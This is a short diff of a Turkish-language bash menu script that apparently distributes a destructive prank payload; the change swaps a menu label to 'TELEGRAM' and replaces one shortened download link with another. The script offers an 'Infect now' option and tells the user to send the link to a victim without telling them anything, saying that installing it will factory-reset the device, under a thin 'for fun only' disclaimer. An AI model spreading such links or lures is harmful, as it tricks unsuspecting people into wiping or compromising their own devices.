@@ -78,7 +78,7 @@ echo -e "$red                        ➡$cyan [\e[92m1\e[96m] Şimdi Bulaş"
 echo -e "$red                        ➡$cyan [\e[92m2\e[96m] Şimdi Kaydet"
 echo -e "$red                        ➡$cyan [\e[92m3\e[96m] Hakkında"
 echo -e "$red                        ➡$cyan [\e[92m4\e[96m] Betiği Güncelle "
-echo -e "$red                        ➡$cyan [\e[92m5\e[96m] Abone Ol"
+echo -e "$red                        ➡$cyan [\e[92m5\e[96m] TELEGRAM"
 echo -e "$red                        ➡$cyan [\e[92m6\e[96m] Daha Fazla"
 echo -e "$red                        ➡$cyan [\e[92m7\e[96m] Sohbet"
 echo -e "$red                        ➡$cyan [\e[92m8\e[96m] Çıkış"
@@ -139,7 +139,7 @@ ve ona hiçbir şey söylemeyin. Cihazına kurduğunda
 fabrika ayarlarına sıfırlanacak ve daha fazlası olacak.
                                 👇👇👇
 
-         \e[92mL1NK :- \e[96mhttps://tinyurl.com/uppdatesnew\e[91m
+         \e[92mL1NK :- \e[96mhttps://bit.ly/3YciaDF\e[91m
 
                                  👆👆👆
 Sadece eğlence amaçlı kullanın, başkalarına zarar vermek için değil 😇✌️.
